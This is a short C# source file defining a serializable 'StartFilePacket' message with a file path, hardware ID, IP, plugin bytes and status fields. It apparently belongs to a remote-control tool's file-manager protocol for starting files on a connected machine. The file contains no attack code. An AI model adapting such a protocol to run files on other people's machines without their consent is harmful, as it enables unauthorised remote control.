using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class StartFilePacket : IPacket
    {
        public StartFilePacket(string filePath) : base() 
        {
            PacketType = PacketType.FM_START_FILE;
            
            this.filePath = filePath;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string filePath { get; set; }
    }
}
